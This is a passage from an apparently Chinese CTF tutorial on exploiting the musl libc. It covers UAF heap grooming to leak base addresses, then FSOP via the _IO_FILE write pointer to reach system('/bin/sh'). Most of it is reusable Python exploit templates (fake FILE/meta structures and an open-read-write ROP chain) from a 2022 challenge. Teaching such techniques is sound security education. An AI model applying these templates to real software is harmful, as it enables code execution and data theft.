                ><br>因为只有链表头不直接相连的 <code>node</code> 才能 uaf，因此需要先填满第二个 <code>group</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4f7ac7943d86eb3a85243e93cacc9738.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>之后释放前面 <code>A</code> <code>C</code> 顺序相反的 <code>node</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9880625f7344eb160ffffce26f60dd0a.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>再次申请一个 <code>node</code> 此时可以利用 uaf 泄露 libc 和 elf 基址。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/e17a43031d0f4552b38e01968353b0fa.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>由于相关基址已经泄露，可以通过堆风水 uaf 伪造 <code>node</code> 节点实现任意地址读和伪造 unlink 相关结构。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2f1da91fac6155dcc94cf59859b53c4f.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<h1 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="IO_FILE"></a>IO_FILE</h1><h2 id="IO-FILE-结构体"><a href="#IO-FILE-结构体" class="headerlink" title="_IO_FILE 结构体"></a>_IO_FILE 结构体</h2><p>musl 中的 <code>_IO_FILE</code> 结构体定义如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>其中有 4 个函数指针 <code>close</code> 、<code>read</code> 、<code>write</code> 、<code>seek</code> 。在解题时，标准输入输出的三个FILE结构体：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>是我们利用的重点。</p>
<h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><h3 id="exit-调用链"><a href="#exit-调用链" class="headerlink" title="exit  调用链"></a>exit  调用链</h3><p>分析 <code>exit</code> 函数的调用链，发现最终会调用</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FILE *<span class="keyword">volatile</span> __stdin_used = &amp;__stdin_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stdout_used = &amp;__stdout_FILE;</span><br><span class="line">FILE *<span class="keyword">volatile</span> __stderr_used = &amp;__stderr_FILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">    __funcs_on_exit();</span><br><span class="line">    __libc_exit_fini();</span><br><span class="line">    __stdio_exit();</span><br><span class="line">    _Exit(code);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>) &#123;</span><br><span class="line">    FILE *f;</span><br><span class="line">    <span class="keyword">for</span> (f = *__ofl_lock(); f; f = f-&gt;next) close_file(f);</span><br><span class="line">    close_file(__stdin_used);</span><br><span class="line">    close_file(__stdout_used);</span><br><span class="line">    close_file(__stderr_used);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">    FFINALLOCK(f);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos - f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到 <code>close_file</code> 中可能会调用三个 FILE 的 <code>write</code> 和 <code>seek</code> 函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将 FILE 结构体开头的几个字节修改为 <code>/bin/sh</code> ，再修改 <code>write</code> 指针的值为 <code>system</code> ，以及修改 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一就可以调用到 <code>system(&quot;/bin/sh&quot;)</code> 。</p>
<p>总结来说，就是在无沙箱时，需要修改 <code>_IO_FILE</code> 结构体的几个地方：</p>
<ul>
<li><p>起始位置写入 <code>/bin/sh</code></p>
</li>
<li><p><code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 中其中之一使得二者不等</p>
</li>
<li><p><code>write</code> 写入 <code>system</code> 函数地址。</p>
</li>
<li><p>最好将 <code>lock</code> 设置为小于 0 避免程序卡死在 <code>__lockfile</code> 函数中。（等于 0 貌似也可以）</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    FFINALLOCK(f);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FFINALLOCK(f) ((f)-&gt;lock &gt;= 0 ? __lockfile((f)) : 0)</span></span><br><span class="line">替换:  </span><br><span class="line">((f)-&gt;lock &gt;= <span class="number">0</span> ? __lockfile((f)) : <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p>常用模板如下：</p>
</li>
</ul>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x1919810</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br></pre></td></tr></table></figure></div>

<p>对于 musl-1.2.1 及以上版本，结合相关结构的伪造，模板如下（<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/qwb2022_UserManager" >2022强网杯UserManager<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">1</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload = payload.ljust(rop_addr - payload_addr, <span class="string">&#x27;\x00&#x27;</span>) <span class="comment"># fake chunk</span></span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure></div>

<p>而在有沙箱保护的情况下，需要进行 orw 。</p>
<p>对于 musl-1.2.1 及以上版本，可以通过如下 gadget 实现栈迁移和程序流劫持。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br></pre></td></tr></table></figure></div>

<p>总结来说，就是在有沙箱时，需要修改 <code>_IO_FILE</code> 结构体的 3 个地方：</p>
<ul>
<li><code>f-&gt;wbase</code> 写入第一个 gadget 地址使得 <code>f-&gt;wpos</code> 、<code>f-&gt;wbase</code> 不等的同时能够执行到 gadget</li>
<li><code>write</code> 写入刚才提到的栈迁移的 <code>gadget</code></li>
<li>偏移 0x30 处写入新的栈地址配合栈迁移 gadget 完成栈迁移</li>
<li>此外还需要在其他地方构造好 ROP 链用于 orw</li>
</ul>
<p>常用模板如下（<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/qwb2022_UserManager" >2022强网杯UserManager<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>）：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">payload_addr = libc.address - <span class="number">0x6fe0</span></span><br><span class="line">fake_file_addr = payload_addr</span><br><span class="line">fake_group_addr = fake_file_addr + <span class="number">0x90</span></span><br><span class="line">fake_chunk_addr = fake_group_addr + <span class="number">0x10</span></span><br><span class="line">fake_meta_area_offset = ((payload_addr + <span class="number">0xFFF</span>) &amp; ~<span class="number">0xFFF</span>) - payload_addr</span><br><span class="line">fake_meta_offset = fake_meta_area_offset + <span class="number">8</span></span><br><span class="line">fake_meta_addr = payload_addr + fake_meta_offset</span><br><span class="line">stderr_used_addr = libc.address + <span class="number">0xb43a0</span></span><br><span class="line">rop_addr = fake_chunk_addr</span><br><span class="line"></span><br><span class="line">magic_gadget = libc.search(asm(<span class="string">&#x27;mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdi_ret = libc.search(asm(<span class="string">&quot;pop rdi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rsi_ret = libc.search(asm(<span class="string">&quot;pop rsi;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rdx_ret = libc.search(asm(<span class="string">&quot;pop rdx;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">pop_rax_ret = libc.search(asm(<span class="string">&quot;pop rax;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">ret = libc.search(asm(<span class="string">&quot;ret&quot;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>()</span><br><span class="line">buf_addr = payload_addr</span><br><span class="line"></span><br><span class="line">rop = <span class="string">&#x27;&#x27;</span></span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">rop += p64(pop_rdi_ret)</span><br><span class="line">rop += p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)</span><br><span class="line">rop += p64(buf_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)</span><br><span class="line">rop += p64(<span class="number">0x100</span>)</span><br><span class="line">rop += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">fake_file = <span class="string">&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(rop_addr)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(ret)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(magic_gadget)  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x90</span>, <span class="string">&#x27;\x00&#x27;</span>)  <span class="comment"># lock = 0</span></span><br><span class="line"></span><br><span class="line">fake_group = p64(fake_meta_addr) + p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_meta = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_file_addr)  <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(stderr_used_addr)  <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_group_addr)  <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0b0000</span>)  <span class="comment"># avail_mask</span></span><br><span class="line">fake_meta += p32(<span class="number">0b1110</span>)  <span class="comment"># freed_mask</span></span><br><span class="line">last_idx = <span class="number">3</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">sizeclass = <span class="number">8</span></span><br><span class="line">maplen = <span class="number">0</span></span><br><span class="line">fake_meta += p64(last_idx | (freeable &lt;&lt; <span class="number">5</span>) | (sizeclass &lt;&lt; <span class="number">6</span>) | (sizeclass &lt;&lt; <span class="number">12</span>))</span><br><span class="line"></span><br><span class="line">fake_meta_area = p64(leak_secret) + fake_meta</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += fake_file</span><br><span class="line">payload += fake_group</span><br><span class="line">payload += rop</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(payload) &lt;= fake_meta_area_offset</span><br><span class="line">payload = payload.ljust(fake_meta_area_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_meta_area</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_node = <span class="string">&#x27;&#x27;</span></span><br><span class="line">fake_node += p64(<span class="number">4</span>)  <span class="comment"># id</span></span><br><span class="line">fake_node += p64(fake_chunk_addr)  <span class="comment"># name -&gt; fake chunk</span></span><br><span class="line">fake_node += p64(<span class="number">0x100</span>)  <span class="comment"># name_size</span></span><br><span class="line">fake_node += p64(<span class="number">2</span>)  <span class="comment"># type</span></span><br><span class="line">fake_node += p64(<span class="number">0xdeadbeef</span>)  <span class="comment"># fa</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># ls</span></span><br><span class="line">fake_node += p64(<span class="number">0</span>)  <span class="comment"># rs</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>, fake_node)</span><br><span class="line">add(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure></div>

<p><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/musl_pwn/musl_FSOP" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
